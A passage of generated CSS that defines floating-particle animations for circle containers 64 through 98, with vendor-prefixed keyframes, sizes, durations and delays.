            transform: translate3d(19vw, -136vh, 0);
  }
}
@keyframes move-frames-64 {
  from {
    -webkit-transform: translate3d(62vw, 110vh, 0);
            transform: translate3d(62vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(19vw, -136vh, 0);
            transform: translate3d(19vw, -136vh, 0);
  }
}
.circle-container:nth-child(64) .circle {
  -webkit-animation-delay: 2936ms;
          animation-delay: 2936ms;
}
.circle-container:nth-child(65) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-65;
          animation-name: move-frames-65;
  -webkit-animation-duration: 29157ms;
          animation-duration: 29157ms;
  -webkit-animation-delay: 22594ms;
          animation-delay: 22594ms;
}
@-webkit-keyframes move-frames-65 {
  from {
    -webkit-transform: translate3d(44vw, 109vh, 0);
            transform: translate3d(44vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -110vh, 0);
            transform: translate3d(69vw, -110vh, 0);
  }
}
@keyframes move-frames-65 {
  from {
    -webkit-transform: translate3d(44vw, 109vh, 0);
            transform: translate3d(44vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -110vh, 0);
            transform: translate3d(69vw, -110vh, 0);
  }
}
.circle-container:nth-child(65) .circle {
  -webkit-animation-delay: 3517ms;
          animation-delay: 3517ms;
}
.circle-container:nth-child(66) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-66;
          animation-name: move-frames-66;
  -webkit-animation-duration: 34171ms;
          animation-duration: 34171ms;
  -webkit-animation-delay: 32742ms;
          animation-delay: 32742ms;
}
@-webkit-keyframes move-frames-66 {
  from {
    -webkit-transform: translate3d(65vw, 102vh, 0);
            transform: translate3d(65vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -118vh, 0);
            transform: translate3d(95vw, -118vh, 0);
  }
}
@keyframes move-frames-66 {
  from {
    -webkit-transform: translate3d(65vw, 102vh, 0);
            transform: translate3d(65vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -118vh, 0);
            transform: translate3d(95vw, -118vh, 0);
  }
}
.circle-container:nth-child(66) .circle {
  -webkit-animation-delay: 1820ms;
          animation-delay: 1820ms;
}
.circle-container:nth-child(67) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-67;
          animation-name: move-frames-67;
  -webkit-animation-duration: 36953ms;
          animation-duration: 36953ms;
  -webkit-animation-delay: 32549ms;
          animation-delay: 32549ms;
}
@-webkit-keyframes move-frames-67 {
  from {
    -webkit-transform: translate3d(5vw, 107vh, 0);
            transform: translate3d(5vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(28vw, -117vh, 0);
            transform: translate3d(28vw, -117vh, 0);
  }
}
@keyframes move-frames-67 {
  from {
    -webkit-transform: translate3d(5vw, 107vh, 0);
            transform: translate3d(5vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(28vw, -117vh, 0);
            transform: translate3d(28vw, -117vh, 0);
  }
}
.circle-container:nth-child(67) .circle {
  -webkit-animation-delay: 1630ms;
          animation-delay: 1630ms;
}
.circle-container:nth-child(68) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-68;
          animation-name: move-frames-68;
  -webkit-animation-duration: 33793ms;
          animation-duration: 33793ms;
  -webkit-animation-delay: 31440ms;
          animation-delay: 31440ms;
}
@-webkit-keyframes move-frames-68 {
  from {
    -webkit-transform: translate3d(29vw, 110vh, 0);
            transform: translate3d(29vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(41vw, -128vh, 0);
            transform: translate3d(41vw, -128vh, 0);
  }
}
@keyframes move-frames-68 {
  from {
    -webkit-transform: translate3d(29vw, 110vh, 0);
            transform: translate3d(29vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(41vw, -128vh, 0);
            transform: translate3d(41vw, -128vh, 0);
  }
}
.circle-container:nth-child(68) .circle {
  -webkit-animation-delay: 2954ms;
          animation-delay: 2954ms;
}
.circle-container:nth-child(69) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-69;
          animation-name: move-frames-69;
  -webkit-animation-duration: 35093ms;
          animation-duration: 35093ms;
  -webkit-animation-delay: 31880ms;
          animation-delay: 31880ms;
}
@-webkit-keyframes move-frames-69 {
  from {
    -webkit-transform: translate3d(59vw, 108vh, 0);
            transform: translate3d(59vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -130vh, 0);
            transform: translate3d(70vw, -130vh, 0);
  }
}
@keyframes move-frames-69 {
  from {
    -webkit-transform: translate3d(59vw, 108vh, 0);
            transform: translate3d(59vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -130vh, 0);
            transform: translate3d(70vw, -130vh, 0);
  }
}
.circle-container:nth-child(69) .circle {
  -webkit-animation-delay: 2850ms;
          animation-delay: 2850ms;
}
.circle-container:nth-child(70) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-70;
          animation-name: move-frames-70;
  -webkit-animation-duration: 28274ms;
          animation-duration: 28274ms;
  -webkit-animation-delay: 20011ms;
          animation-delay: 20011ms;
}
@-webkit-keyframes move-frames-70 {
  from {
    -webkit-transform: translate3d(22vw, 105vh, 0);
            transform: translate3d(22vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -129vh, 0);
            transform: translate3d(60vw, -129vh, 0);
  }
}
@keyframes move-frames-70 {
  from {
    -webkit-transform: translate3d(22vw, 105vh, 0);
            transform: translate3d(22vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -129vh, 0);
            transform: translate3d(60vw, -129vh, 0);
  }
}
.circle-container:nth-child(70) .circle {
  -webkit-animation-delay: 1372ms;
          animation-delay: 1372ms;
}
.circle-container:nth-child(71) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-71;
          animation-name: move-frames-71;
  -webkit-animation-duration: 32116ms;
          animation-duration: 32116ms;
  -webkit-animation-delay: 2702ms;
          animation-delay: 2702ms;
}
@-webkit-keyframes move-frames-71 {
  from {
    -webkit-transform: translate3d(63vw, 103vh, 0);
            transform: translate3d(63vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(4vw, -110vh, 0);
            transform: translate3d(4vw, -110vh, 0);
  }
}
@keyframes move-frames-71 {
  from {
    -webkit-transform: translate3d(63vw, 103vh, 0);
            transform: translate3d(63vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(4vw, -110vh, 0);
            transform: translate3d(4vw, -110vh, 0);
  }
}
.circle-container:nth-child(71) .circle {
  -webkit-animation-delay: 2592ms;
          animation-delay: 2592ms;
}
.circle-container:nth-child(72) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-72;
          animation-name: move-frames-72;
  -webkit-animation-duration: 34249ms;
          animation-duration: 34249ms;
  -webkit-animation-delay: 16848ms;
          animation-delay: 16848ms;
}
@-webkit-keyframes move-frames-72 {
  from {
    -webkit-transform: translate3d(51vw, 102vh, 0);
            transform: translate3d(51vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(100vw, -111vh, 0);
            transform: translate3d(100vw, -111vh, 0);
  }
}
@keyframes move-frames-72 {
  from {
    -webkit-transform: translate3d(51vw, 102vh, 0);
            transform: translate3d(51vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(100vw, -111vh, 0);
            transform: translate3d(100vw, -111vh, 0);
  }
}
.circle-container:nth-child(72) .circle {
  -webkit-animation-delay: 1877ms;
          animation-delay: 1877ms;
}
.circle-container:nth-child(73) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-73;
          animation-name: move-frames-73;
  -webkit-animation-duration: 34193ms;
          animation-duration: 34193ms;
  -webkit-animation-delay: 17947ms;
          animation-delay: 17947ms;
}
@-webkit-keyframes move-frames-73 {
  from {
    -webkit-transform: translate3d(33vw, 101vh, 0);
            transform: translate3d(33vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -122vh, 0);
            transform: translate3d(80vw, -122vh, 0);
  }
}
@keyframes move-frames-73 {
  from {
    -webkit-transform: translate3d(33vw, 101vh, 0);
            transform: translate3d(33vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -122vh, 0);
            transform: translate3d(80vw, -122vh, 0);
  }
}
.circle-container:nth-child(73) .circle {
  -webkit-animation-delay: 2893ms;
          animation-delay: 2893ms;
}
.circle-container:nth-child(74) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-74;
          animation-name: move-frames-74;
  -webkit-animation-duration: 30765ms;
          animation-duration: 30765ms;
  -webkit-animation-delay: 27081ms;
          animation-delay: 27081ms;
}
@-webkit-keyframes move-frames-74 {
  from {
    -webkit-transform: translate3d(2vw, 102vh, 0);
            transform: translate3d(2vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(61vw, -128vh, 0);
            transform: translate3d(61vw, -128vh, 0);
  }
}
@keyframes move-frames-74 {
  from {
    -webkit-transform: translate3d(2vw, 102vh, 0);
            transform: translate3d(2vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(61vw, -128vh, 0);
            transform: translate3d(61vw, -128vh, 0);
  }
}
.circle-container:nth-child(74) .circle {
  -webkit-animation-delay: 439ms;
          animation-delay: 439ms;
}
.circle-container:nth-child(75) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-75;
          animation-name: move-frames-75;
  -webkit-animation-duration: 33611ms;
          animation-duration: 33611ms;
  -webkit-animation-delay: 13604ms;
          animation-delay: 13604ms;
}
@-webkit-keyframes move-frames-75 {
  from {
    -webkit-transform: translate3d(1vw, 107vh, 0);
            transform: translate3d(1vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(87vw, -132vh, 0);
            transform: translate3d(87vw, -132vh, 0);
  }
}
@keyframes move-frames-75 {
  from {
    -webkit-transform: translate3d(1vw, 107vh, 0);
            transform: translate3d(1vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(87vw, -132vh, 0);
            transform: translate3d(87vw, -132vh, 0);
  }
}
.circle-container:nth-child(75) .circle {
  -webkit-animation-delay: 3103ms;
          animation-delay: 3103ms;
}
.circle-container:nth-child(76) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-76;
          animation-name: move-frames-76;
  -webkit-animation-duration: 28260ms;
          animation-duration: 28260ms;
  -webkit-animation-delay: 2918ms;
          animation-delay: 2918ms;
}
@-webkit-keyframes move-frames-76 {
  from {
    -webkit-transform: translate3d(86vw, 107vh, 0);
            transform: translate3d(86vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -117vh, 0);
            transform: translate3d(45vw, -117vh, 0);
  }
}
@keyframes move-frames-76 {
  from {
    -webkit-transform: translate3d(86vw, 107vh, 0);
            transform: translate3d(86vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -117vh, 0);
            transform: translate3d(45vw, -117vh, 0);
  }
}
.circle-container:nth-child(76) .circle {
  -webkit-animation-delay: 2125ms;
          animation-delay: 2125ms;
}
.circle-container:nth-child(77) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-77;
          animation-name: move-frames-77;
  -webkit-animation-duration: 35008ms;
          animation-duration: 35008ms;
  -webkit-animation-delay: 20161ms;
          animation-delay: 20161ms;
}
@-webkit-keyframes move-frames-77 {
  from {
    -webkit-transform: translate3d(73vw, 109vh, 0);
            transform: translate3d(73vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -113vh, 0);
            transform: translate3d(50vw, -113vh, 0);
  }
}
@keyframes move-frames-77 {
  from {
    -webkit-transform: translate3d(73vw, 109vh, 0);
            transform: translate3d(73vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -113vh, 0);
            transform: translate3d(50vw, -113vh, 0);
  }
}
.circle-container:nth-child(77) .circle {
  -webkit-animation-delay: 3507ms;
          animation-delay: 3507ms;
}
.circle-container:nth-child(78) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-78;
          animation-name: move-frames-78;
  -webkit-animation-duration: 33056ms;
          animation-duration: 33056ms;
  -webkit-animation-delay: 35877ms;
          animation-delay: 35877ms;
}
@-webkit-keyframes move-frames-78 {
  from {
    -webkit-transform: translate3d(33vw, 109vh, 0);
            transform: translate3d(33vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -113vh, 0);
            transform: translate3d(3vw, -113vh, 0);
  }
}
@keyframes move-frames-78 {
  from {
    -webkit-transform: translate3d(33vw, 109vh, 0);
            transform: translate3d(33vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -113vh, 0);
            transform: translate3d(3vw, -113vh, 0);
  }
}
.circle-container:nth-child(78) .circle {
  -webkit-animation-delay: 704ms;
          animation-delay: 704ms;
}
.circle-container:nth-child(79) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-79;
          animation-name: move-frames-79;
  -webkit-animation-duration: 36851ms;
          animation-duration: 36851ms;
  -webkit-animation-delay: 20446ms;
          animation-delay: 20446ms;
}
@-webkit-keyframes move-frames-79 {
  from {
    -webkit-transform: translate3d(20vw, 110vh, 0);
            transform: translate3d(20vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -135vh, 0);
            transform: translate3d(32vw, -135vh, 0);
  }
}
@keyframes move-frames-79 {
  from {
    -webkit-transform: translate3d(20vw, 110vh, 0);
            transform: translate3d(20vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -135vh, 0);
            transform: translate3d(32vw, -135vh, 0);
  }
}
.circle-container:nth-child(79) .circle {
  -webkit-animation-delay: 1713ms;
          animation-delay: 1713ms;
}
.circle-container:nth-child(80) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-80;
          animation-name: move-frames-80;
  -webkit-animation-duration: 34544ms;
          animation-duration: 34544ms;
  -webkit-animation-delay: 1810ms;
          animation-delay: 1810ms;
}
@-webkit-keyframes move-frames-80 {
  from {
    -webkit-transform: translate3d(61vw, 106vh, 0);
            transform: translate3d(61vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(19vw, -130vh, 0);
            transform: translate3d(19vw, -130vh, 0);
  }
}
@keyframes move-frames-80 {
  from {
    -webkit-transform: translate3d(61vw, 106vh, 0);
            transform: translate3d(61vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(19vw, -130vh, 0);
            transform: translate3d(19vw, -130vh, 0);
  }
}
.circle-container:nth-child(80) .circle {
  -webkit-animation-delay: 1556ms;
          animation-delay: 1556ms;
}
.circle-container:nth-child(81) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-81;
          animation-name: move-frames-81;
  -webkit-animation-duration: 29012ms;
          animation-duration: 29012ms;
  -webkit-animation-delay: 6814ms;
          animation-delay: 6814ms;
}
@-webkit-keyframes move-frames-81 {
  from {
    -webkit-transform: translate3d(62vw, 109vh, 0);
            transform: translate3d(62vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -120vh, 0);
            transform: translate3d(44vw, -120vh, 0);
  }
}
@keyframes move-frames-81 {
  from {
    -webkit-transform: translate3d(62vw, 109vh, 0);
            transform: translate3d(62vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -120vh, 0);
            transform: translate3d(44vw, -120vh, 0);
  }
}
.circle-container:nth-child(81) .circle {
  -webkit-animation-delay: 1892ms;
          animation-delay: 1892ms;
}
.circle-container:nth-child(82) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-82;
          animation-name: move-frames-82;
  -webkit-animation-duration: 36111ms;
          animation-duration: 36111ms;
  -webkit-animation-delay: 19172ms;
          animation-delay: 19172ms;
}
@-webkit-keyframes move-frames-82 {
  from {
    -webkit-transform: translate3d(69vw, 103vh, 0);
            transform: translate3d(69vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(16vw, -116vh, 0);
            transform: translate3d(16vw, -116vh, 0);
  }
}
@keyframes move-frames-82 {
  from {
    -webkit-transform: translate3d(69vw, 103vh, 0);
            transform: translate3d(69vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(16vw, -116vh, 0);
            transform: translate3d(16vw, -116vh, 0);
  }
}
.circle-container:nth-child(82) .circle {
  -webkit-animation-delay: 644ms;
          animation-delay: 644ms;
}
.circle-container:nth-child(83) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-83;
          animation-name: move-frames-83;
  -webkit-animation-duration: 31246ms;
          animation-duration: 31246ms;
  -webkit-animation-delay: 33230ms;
          animation-delay: 33230ms;
}
@-webkit-keyframes move-frames-83 {
  from {
    -webkit-transform: translate3d(17vw, 106vh, 0);
            transform: translate3d(17vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -126vh, 0);
            transform: translate3d(36vw, -126vh, 0);
  }
}
@keyframes move-frames-83 {
  from {
    -webkit-transform: translate3d(17vw, 106vh, 0);
            transform: translate3d(17vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -126vh, 0);
            transform: translate3d(36vw, -126vh, 0);
  }
}
.circle-container:nth-child(83) .circle {
  -webkit-animation-delay: 2231ms;
          animation-delay: 2231ms;
}
.circle-container:nth-child(84) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-84;
          animation-name: move-frames-84;
  -webkit-animation-duration: 33765ms;
          animation-duration: 33765ms;
  -webkit-animation-delay: 33582ms;
          animation-delay: 33582ms;
}
@-webkit-keyframes move-frames-84 {
  from {
    -webkit-transform: translate3d(19vw, 101vh, 0);
            transform: translate3d(19vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -105vh, 0);
            transform: translate3d(92vw, -105vh, 0);
  }
}
@keyframes move-frames-84 {
  from {
    -webkit-transform: translate3d(19vw, 101vh, 0);
            transform: translate3d(19vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -105vh, 0);
            transform: translate3d(92vw, -105vh, 0);
  }
}
.circle-container:nth-child(84) .circle {
  -webkit-animation-delay: 2600ms;
          animation-delay: 2600ms;
}
.circle-container:nth-child(85) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-85;
          animation-name: move-frames-85;
  -webkit-animation-duration: 33569ms;
          animation-duration: 33569ms;
  -webkit-animation-delay: 14179ms;
          animation-delay: 14179ms;
}
@-webkit-keyframes move-frames-85 {
  from {
    -webkit-transform: translate3d(19vw, 105vh, 0);
            transform: translate3d(19vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -122vh, 0);
            transform: translate3d(24vw, -122vh, 0);
  }
}
@keyframes move-frames-85 {
  from {
    -webkit-transform: translate3d(19vw, 105vh, 0);
            transform: translate3d(19vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -122vh, 0);
            transform: translate3d(24vw, -122vh, 0);
  }
}
.circle-container:nth-child(85) .circle {
  -webkit-animation-delay: 1565ms;
          animation-delay: 1565ms;
}
.circle-container:nth-child(86) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-86;
          animation-name: move-frames-86;
  -webkit-animation-duration: 31266ms;
          animation-duration: 31266ms;
  -webkit-animation-delay: 5873ms;
          animation-delay: 5873ms;
}
@-webkit-keyframes move-frames-86 {
  from {
    -webkit-transform: translate3d(73vw, 110vh, 0);
            transform: translate3d(73vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -138vh, 0);
            transform: translate3d(14vw, -138vh, 0);
  }
}
@keyframes move-frames-86 {
  from {
    -webkit-transform: translate3d(73vw, 110vh, 0);
            transform: translate3d(73vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -138vh, 0);
            transform: translate3d(14vw, -138vh, 0);
  }
}
.circle-container:nth-child(86) .circle {
  -webkit-animation-delay: 996ms;
          animation-delay: 996ms;
}
.circle-container:nth-child(87) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-87;
          animation-name: move-frames-87;
  -webkit-animation-duration: 31477ms;
          animation-duration: 31477ms;
  -webkit-animation-delay: 18429ms;
          animation-delay: 18429ms;
}
@-webkit-keyframes move-frames-87 {
  from {
    -webkit-transform: translate3d(3vw, 101vh, 0);
            transform: translate3d(3vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(26vw, -118vh, 0);
            transform: translate3d(26vw, -118vh, 0);
  }
}
@keyframes move-frames-87 {
  from {
    -webkit-transform: translate3d(3vw, 101vh, 0);
            transform: translate3d(3vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(26vw, -118vh, 0);
            transform: translate3d(26vw, -118vh, 0);
  }
}
.circle-container:nth-child(87) .circle {
  -webkit-animation-delay: 3175ms;
          animation-delay: 3175ms;
}
.circle-container:nth-child(88) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-88;
          animation-name: move-frames-88;
  -webkit-animation-duration: 28847ms;
          animation-duration: 28847ms;
  -webkit-animation-delay: 20676ms;
          animation-delay: 20676ms;
}
@-webkit-keyframes move-frames-88 {
  from {
    -webkit-transform: translate3d(73vw, 105vh, 0);
            transform: translate3d(73vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -129vh, 0);
            transform: translate3d(37vw, -129vh, 0);
  }
}
@keyframes move-frames-88 {
  from {
    -webkit-transform: translate3d(73vw, 105vh, 0);
            transform: translate3d(73vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -129vh, 0);
            transform: translate3d(37vw, -129vh, 0);
  }
}
.circle-container:nth-child(88) .circle {
  -webkit-animation-delay: 2037ms;
          animation-delay: 2037ms;
}
.circle-container:nth-child(89) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-89;
          animation-name: move-frames-89;
  -webkit-animation-duration: 35877ms;
          animation-duration: 35877ms;
  -webkit-animation-delay: 28004ms;
          animation-delay: 28004ms;
}
@-webkit-keyframes move-frames-89 {
  from {
    -webkit-transform: translate3d(8vw, 110vh, 0);
            transform: translate3d(8vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -122vh, 0);
            transform: translate3d(6vw, -122vh, 0);
  }
}
@keyframes move-frames-89 {
  from {
    -webkit-transform: translate3d(8vw, 110vh, 0);
            transform: translate3d(8vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -122vh, 0);
            transform: translate3d(6vw, -122vh, 0);
  }
}
.circle-container:nth-child(89) .circle {
  -webkit-animation-delay: 3587ms;
          animation-delay: 3587ms;
}
.circle-container:nth-child(90) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-90;
          animation-name: move-frames-90;
  -webkit-animation-duration: 29500ms;
          animation-duration: 29500ms;
  -webkit-animation-delay: 14162ms;
          animation-delay: 14162ms;
}
@-webkit-keyframes move-frames-90 {
  from {
    -webkit-transform: translate3d(49vw, 109vh, 0);
            transform: translate3d(49vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(7vw, -138vh, 0);
            transform: translate3d(7vw, -138vh, 0);
  }
}
@keyframes move-frames-90 {
  from {
    -webkit-transform: translate3d(49vw, 109vh, 0);
            transform: translate3d(49vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(7vw, -138vh, 0);
            transform: translate3d(7vw, -138vh, 0);
  }
}
.circle-container:nth-child(90) .circle {
  -webkit-animation-delay: 1764ms;
          animation-delay: 1764ms;
}
.circle-container:nth-child(91) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-91;
          animation-name: move-frames-91;
  -webkit-animation-duration: 36646ms;
          animation-duration: 36646ms;
  -webkit-animation-delay: 21134ms;
          animation-delay: 21134ms;
}
@-webkit-keyframes move-frames-91 {
  from {
    -webkit-transform: translate3d(79vw, 106vh, 0);
            transform: translate3d(79vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -129vh, 0);
            transform: translate3d(65vw, -129vh, 0);
  }
}
@keyframes move-frames-91 {
  from {
    -webkit-transform: translate3d(79vw, 106vh, 0);
            transform: translate3d(79vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -129vh, 0);
            transform: translate3d(65vw, -129vh, 0);
  }
}
.circle-container:nth-child(91) .circle {
  -webkit-animation-delay: 2888ms;
          animation-delay: 2888ms;
}
.circle-container:nth-child(92) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-92;
          animation-name: move-frames-92;
  -webkit-animation-duration: 32964ms;
          animation-duration: 32964ms;
  -webkit-animation-delay: 31163ms;
          animation-delay: 31163ms;
}
@-webkit-keyframes move-frames-92 {
  from {
    -webkit-transform: translate3d(24vw, 108vh, 0);
            transform: translate3d(24vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(21vw, -111vh, 0);
            transform: translate3d(21vw, -111vh, 0);
  }
}
@keyframes move-frames-92 {
  from {
    -webkit-transform: translate3d(24vw, 108vh, 0);
            transform: translate3d(24vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(21vw, -111vh, 0);
            transform: translate3d(21vw, -111vh, 0);
  }
}
.circle-container:nth-child(92) .circle {
  -webkit-animation-delay: 2788ms;
          animation-delay: 2788ms;
}
.circle-container:nth-child(93) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-93;
          animation-name: move-frames-93;
  -webkit-animation-duration: 30843ms;
          animation-duration: 30843ms;
  -webkit-animation-delay: 28538ms;
          animation-delay: 28538ms;
}
@-webkit-keyframes move-frames-93 {
  from {
    -webkit-transform: translate3d(83vw, 104vh, 0);
            transform: translate3d(83vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -109vh, 0);
            transform: translate3d(94vw, -109vh, 0);
  }
}
@keyframes move-frames-93 {
  from {
    -webkit-transform: translate3d(83vw, 104vh, 0);
            transform: translate3d(83vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -109vh, 0);
            transform: translate3d(94vw, -109vh, 0);
  }
}
.circle-container:nth-child(93) .circle {
  -webkit-animation-delay: 3494ms;
          animation-delay: 3494ms;
}
.circle-container:nth-child(94) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-94;
          animation-name: move-frames-94;
  -webkit-animation-duration: 30423ms;
          animation-duration: 30423ms;
  -webkit-animation-delay: 32084ms;
          animation-delay: 32084ms;
}
@-webkit-keyframes move-frames-94 {
  from {
    -webkit-transform: translate3d(29vw, 107vh, 0);
            transform: translate3d(29vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(35vw, -135vh, 0);
            transform: translate3d(35vw, -135vh, 0);
  }
}
@keyframes move-frames-94 {
  from {
    -webkit-transform: translate3d(29vw, 107vh, 0);
            transform: translate3d(29vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(35vw, -135vh, 0);
            transform: translate3d(35vw, -135vh, 0);
  }
}
.circle-container:nth-child(94) .circle {
  -webkit-animation-delay: 3607ms;
          animation-delay: 3607ms;
}
.circle-container:nth-child(95) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-95;
          animation-name: move-frames-95;
  -webkit-animation-duration: 29210ms;
          animation-duration: 29210ms;
  -webkit-animation-delay: 16119ms;
          animation-delay: 16119ms;
}
@-webkit-keyframes move-frames-95 {
  from {
    -webkit-transform: translate3d(33vw, 107vh, 0);
            transform: translate3d(33vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(25vw, -124vh, 0);
            transform: translate3d(25vw, -124vh, 0);
  }
}
@keyframes move-frames-95 {
  from {
    -webkit-transform: translate3d(33vw, 107vh, 0);
            transform: translate3d(33vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(25vw, -124vh, 0);
            transform: translate3d(25vw, -124vh, 0);
  }
}
.circle-container:nth-child(95) .circle {
  -webkit-animation-delay: 2063ms;
          animation-delay: 2063ms;
}
.circle-container:nth-child(96) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-96;
          animation-name: move-frames-96;
  -webkit-animation-duration: 33915ms;
          animation-duration: 33915ms;
  -webkit-animation-delay: 24160ms;
          animation-delay: 24160ms;
}
@-webkit-keyframes move-frames-96 {
  from {
    -webkit-transform: translate3d(60vw, 105vh, 0);
            transform: translate3d(60vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -107vh, 0);
            transform: translate3d(80vw, -107vh, 0);
  }
}
@keyframes move-frames-96 {
  from {
    -webkit-transform: translate3d(60vw, 105vh, 0);
            transform: translate3d(60vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -107vh, 0);
            transform: translate3d(80vw, -107vh, 0);
  }
}
.circle-container:nth-child(96) .circle {
  -webkit-animation-delay: 2381ms;
          animation-delay: 2381ms;
}
.circle-container:nth-child(97) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-97;
          animation-name: move-frames-97;
  -webkit-animation-duration: 34524ms;
          animation-duration: 34524ms;
  -webkit-animation-delay: 29439ms;
          animation-delay: 29439ms;
}
@-webkit-keyframes move-frames-97 {
  from {
    -webkit-transform: translate3d(97vw, 109vh, 0);
            transform: translate3d(97vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(21vw, -137vh, 0);
            transform: translate3d(21vw, -137vh, 0);
  }
}
@keyframes move-frames-97 {
  from {
    -webkit-transform: translate3d(97vw, 109vh, 0);
            transform: translate3d(97vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(21vw, -137vh, 0);
            transform: translate3d(21vw, -137vh, 0);
  }
}
.circle-container:nth-child(97) .circle {
  -webkit-animation-delay: 2202ms;
          animation-delay: 2202ms;
}
.circle-container:nth-child(98) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-98;
          animation-name: move-frames-98;
